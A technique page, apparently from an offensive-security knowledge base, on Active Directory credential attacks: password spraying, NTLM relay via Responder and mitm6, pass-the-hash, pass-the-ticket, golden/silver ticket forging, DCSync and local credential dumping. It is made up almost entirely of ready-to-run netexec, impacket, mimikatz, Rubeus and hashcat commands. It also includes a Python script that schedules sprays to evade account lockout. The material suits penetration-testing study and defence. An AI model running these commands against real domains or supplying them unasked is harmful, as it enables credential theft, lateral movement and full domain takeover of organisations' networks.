---
title: "AD Credential Attacks - Spraying, Relay, PtH/PtT and DCSync"
category: misc
subcategory: active-directory
type: technique
tags: [password-spraying, ntlm-relay, pass-the-hash, pass-the-ticket, dcsync, active-directory, netexec, impacket, responder, mitm6, evil-winrm, secretsdump, hashcat, mimikatz, kerbrute]
difficulty: hard
summary: "Move credentials laterally: spray one password across users, relay coerced NTLM auth, replay hashes/tickets, and DCSync the whole domain once you have replication rights."
when_to_use:
  - "You have one credential/hash and want to widen access or reach a DC"
  - "SMB signing is disabled on hosts (relay is viable)"
  - "You captured an NTLM hash from Responder or coerced authentication"
  - "BloodHound shows GetChanges + GetChangesAll (DCSync) on your principal"
tools: [netexec, impacket, responder, mitm6, evil-winrm, hashcat, mimikatz, kerbrute]
related: [ad-enumeration-bloodhound, ad-kerberoasting-asreproast, ad-acl-delegation-abuse, net-mitm]
---

## TL;DR

Four moves that turn one credential into domain compromise: **spray** a likely password across all
users, **relay** coerced NTLM auth to a host that lacks signing, **replay** an NT hash or Kerberos
ticket to authenticate without the plaintext, and **DCSync** to pull every hash once you hold
replication rights. Check the lockout policy before spraying anything.

## Recognise it

- You cracked or found one password and want to know where else it works.
- `netexec` shows `signing:False` on SMB (relay candidate).
- Responder or a coercion (PetitPotam/PrinterBug) captured an NTLMv2 hash you cannot crack.
- BloodHound: your principal has `GetChanges`+`GetChangesAll`, or is in Domain Admins.

## Theory

NTLM authenticates with the NT hash directly, so the hash *is* the credential (pass-the-hash).
Kerberos authenticates with tickets derived from the key, so a stolen TGT/TGS is the credential
(pass-the-ticket). Relay works because NTLM has no channel binding by default: an attacker in the
middle forwards the victim's challenge-response to a third host. DCSync abuses the directory
replication protocol (DRSUAPI) to ask a DC for account secrets.

## Attack

### Password spraying

```bash
# ALWAYS read the lockout policy first -- badPwdCount, lockoutThreshold, observation window
netexec smb 10.10.10.5 -u jdoe -p 'Summer2024!' --pass-pol

# One password across a user list; keep going after a success
netexec smb 10.10.10.5 -u users.txt -p 'Winter2024!' --continue-on-success

# Spray over LDAP (does not always increment badPwdCount the same way; quieter)
netexec ldap 10.10.10.5 -u users.txt -p 'Winter2024!' --continue-on-success

# kerbrute: pre-auth spray, fast, one password many users
kerbrute passwordspray -d corp.local --dc 10.10.10.5 users.txt 'Winter2024!'

# Username == password check
netexec smb 10.10.10.5 -u users.txt -p users.txt --no-bruteforce --continue-on-success
```

Spray discipline: **one password per round**, wait out the observation window between rounds, and
stop before `lockoutThreshold - 1`. Seasonal + year (`Autumn2024!`), `CompanyName1!`, and the
password policy's minimum-complexity pattern are the highest-yield guesses.

### NTLM relay

Precondition: SMB signing disabled on the relay target. Turn off Responder's own SMB/HTTP servers
so ntlmrelayx can bind them.

```bash
# Find hosts without SMB signing (relay targets)
netexec smb 10.10.10.0/24 --gen-relay-list relay-targets.txt

# Poison name resolution but keep SMB/HTTP off (edit Responder.conf: SMB=Off, HTTP=Off)
responder -I tun0 -dwv

# Relay captured auth to the target list; run a command on success
ntlmrelayx.py -tf relay-targets.txt -smb2support -c 'whoami'

# Relay and dump the SAM instead
ntlmrelayx.py -tf relay-targets.txt -smb2support

# Relay to LDAP(S) to grant RBCD or edit ACLs; --escalate-user promotes a controlled user
ntlmrelayx.py -t ldaps://10.10.10.5 --escalate-user jdoe

# Start a SOCKS proxy over each relayed session for interactive use
ntlmrelayx.py -tf relay-targets.txt -smb2support -socks
```

IPv6 takeover combo (mitm6 becomes the DNS server, relays to LDAP):

```bash
# mitm6 spoofs DHCPv6/DNS for the domain
mitm6 -d corp.local

# Relay the resulting auth to LDAP over IPv6, add a computer / delegate access
ntlmrelayx.py -6 -t ldaps://dc01.corp.local -wh fakewpad.corp.local --delegate-access
```

Relaying to AD CS HTTP enrolment is ESC8 -- see `ad-adcs-esc-attacks`.

### Pass-the-hash

The NT hash alone authenticates over NTLM-capable services. Hash format is `LMHASH:NTHASH`; use
`aad3b435b51404eeaad3b435b51404ee` for an empty LM half.

```bash
# netexec pass-the-hash over SMB (validate + check admin)
netexec smb 10.10.10.0/24 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

# impacket psexec / wmiexec with a hash
psexec.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 corp.local/Administrator@10.10.10.5
wmiexec.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 corp.local/Administrator@10.10.10.5

# WinRM with a hash
evil-winrm -i 10.10.10.5 -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0

# RDP with a hash (requires Restricted Admin mode on the target)
xfreerdp /u:Administrator /pth:31d6cfe0d16ae931b73c59d7e0c089c0 /v:10.10.10.5
```

### Overpass-the-hash / pass-the-key

Turn an NT hash (or AES key) into a Kerberos TGT, then use Kerberos.

```bash
# impacket: get a TGT from an NT hash, save to ccache
getTGT.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 corp.local/Administrator -dc-ip 10.10.10.5
export KRB5CCNAME=Administrator.ccache

# Use the ticket (-k -no-pass) for a shell
psexec.py -k -no-pass corp.local/Administrator@dc01.corp.local

# Rubeus (Windows): request a TGT from the RC4 hash and inject it
.\Rubeus.exe asktgt /user:Administrator /rc4:31d6cfe0d16ae931b73c59d7e0c089c0 /ptt
```

### Pass-the-ticket

```bash
# Convert a Windows .kirbi to a Linux ccache (and vice versa)
ticketConverter.py ticket.kirbi ticket.ccache

# Use a captured ccache
export KRB5CCNAME=/tmp/ticket.ccache
netexec smb dc01.corp.local -k --use-kcache

# Rubeus injects a base64 ticket into the current session
.\Rubeus.exe ptt /ticket:doIF...base64...
```

Silver ticket (forge a TGS for one service using that service account's hash) and golden ticket
(forge a TGT using the krbtgt hash) are the extreme cases:

```bash
# Golden ticket with the krbtgt NT hash and the domain SID
ticketer.py -nthash <krbtgt_nt> -domain-sid S-1-5-21-... -domain corp.local Administrator
export KRB5CCNAME=Administrator.ccache

# Silver ticket for CIFS on one host using that machine account's hash
ticketer.py -nthash <machine_nt> -domain-sid S-1-5-21-... -domain corp.local -spn cifs/host.corp.local Administrator
```

### DCSync

Requires `GetChanges` + `GetChangesAll` (Domain Admins, Domain Controllers, or an ACL grant).

```bash
# Dump every account's NTLM hash via replication (no code on the DC)
secretsdump.py -just-dc-ntlm corp.local/Administrator:'P@ss'@10.10.10.5

# Everything (NTLM + Kerberos keys + cleartext where stored)
secretsdump.py -just-dc corp.local/Administrator:'P@ss'@10.10.10.5

# Only the krbtgt account (for a golden ticket)
secretsdump.py -just-dc-user krbtgt corp.local/Administrator:'P@ss'@10.10.10.5

# netexec module
netexec smb 10.10.10.5 -u Administrator -p 'P@ss' --ntds

# mimikatz on the DC / with the right rights
lsadump::dcsync /domain:corp.local /user:krbtgt
```

### Dumping credentials locally

```bash
# From offline registry hives (local accounts)
secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL

# Remotely dump SAM + LSA secrets + cached domain creds
secretsdump.py corp.local/Administrator:'P@ss'@10.10.10.5

# lsassy pulls creds from lsass across hosts you admin
netexec smb 10.10.10.0/24 -u Administrator -H <hash> -M lsassy

# mimikatz on a Windows foothold
sekurlsa::logonpasswords
```

Crack recovered NTLM hashes with hashcat mode **1000**:

```bash
# Crack NT hashes
hashcat -m 1000 nt.hashes /usr/share/wordlists/rockyou.txt -r rules/best64.rule
```

## Code

Spray planner: reads a `--pass-pol` output and tells you the safe batch size and wait interval so
you never trip lockout.

```python
#!/usr/bin/env python3
"""Turn an AD lockout policy into a safe spray plan.

Usage:
    netexec smb DC -u u -p p --pass-pol | python3 spray_plan.py
    # or paste the numbers as args:
    python3 spray_plan.py --threshold 5 --window 30
"""
from __future__ import annotations

import re
import sys


def parse_stdin(text: str) -> tuple[int, int]:
    """Extract (lockout_threshold, observation_window_minutes) from --pass-pol text."""
    threshold = 0
    window = 30
    m = re.search(r"Account Lockout Threshold[^\d]*(\d+)", text, re.IGNORECASE)
    if m:
        threshold = int(m.group(1))
    m = re.search(r"Reset Account Lockout Counter[^\d]*(\d+)", text, re.IGNORECASE)
    if m:
        window = int(m.group(1))
    return threshold, window


def plan(threshold: int, window: int) -> None:
    """Print a conservative spray schedule."""
    if threshold == 0:
        print("[*] Lockout threshold = 0 (no lockout). Spray freely, but stay quiet.")
        print("    Suggested: 1 password/round, ~1s delay, monitor for defenders.")
        return
    safe = max(1, threshold - 1)
    print(f"[*] Lockout threshold: {threshold} attempts")
    print(f"[*] Observation window: {window} minutes")
    print(f"[+] Safe attempts per account before reset: {safe}")
    print(f"[+] Plan: try {safe} password(s), then WAIT {window + 1} minutes before the next round.")
    print("[+] netexec: add --continue-on-success and one -p per round only.")


def main(argv: list[str]) -> int:
    if "--threshold" in argv:
        t = int(argv[argv.index("--threshold") + 1])
        w = int(argv[argv.index("--window") + 1]) if "--window" in argv else 30
        plan(t, w)
        return 0
    data = sys.stdin.read()
    if not data.strip():
        print(__doc__)
        return 1
    t, w = parse_stdin(data)
    plan(t, w)
    return 0


if __name__ == "__main__":
    # self-test the parser on a synthetic policy blob
    sample = "Account Lockout Threshold: 5\nReset Account Lockout Counter: 30 minutes"
    assert parse_stdin(sample) == (5, 30)
    raise SystemExit(main(sys.argv))
```

## Variants & pitfalls

- **Lockout is the classic own-goal.** One reckless spray locks every account and burns the box.
  Read the policy, subtract one, respect the window.
- **Relay needs signing OFF.** `netexec ... --gen-relay-list` gives you exactly the eligible hosts.
  You cannot relay back to the machine that authenticated (reflection is patched).
- **PtH does not work over Kerberos-only paths.** If NTLM is disabled, use overpass-the-hash to get
  a TGT first.
- **Clock skew** kills every ticket operation; sync to the DC.
- **`aad3b435b51404eeaad3b435b51404ee`** is the empty LM hash -- use it as the LM half everywhere.
- **DCSync needs replication rights**, not just admin on a member server. Confirm the edge in
  BloodHound before trying.
- **ccache vs kirbi.** Linux impacket uses ccache (`KRB5CCNAME`), Windows Rubeus uses kirbi;
  `ticketConverter.py` bridges them.
- **Golden/silver tickets are forgeries** -- only meaningful once you already hold krbtgt or a
  service hash; they are persistence, not initial access.

## Tools

- `netexec` -- spraying, PtH, relay-list generation, `--ntds`, `-M lsassy`.
- `impacket` -- `psexec/wmiexec/smbexec/atexec`, `ntlmrelayx.py`, `secretsdump.py`, `getTGT.py`,
  `ticketer.py`, `ticketConverter.py`.
- `responder`, `mitm6` -- coercion / poisoning to feed the relay.
- `evil-winrm`, `xfreerdp` -- authenticated access with hash/ticket.
- `mimikatz`, `Rubeus` -- Windows-side credential and ticket manipulation.
- `hashcat` (mode 1000 for NTLM) -- cracking recovered hashes.

## References

- `[MS-DRSR]` (directory replication) for what DCSync abuses.
- RFC 4120 for the Kerberos ticket model behind PtT.
- The impacket and netexec example-script help text for exact flags.
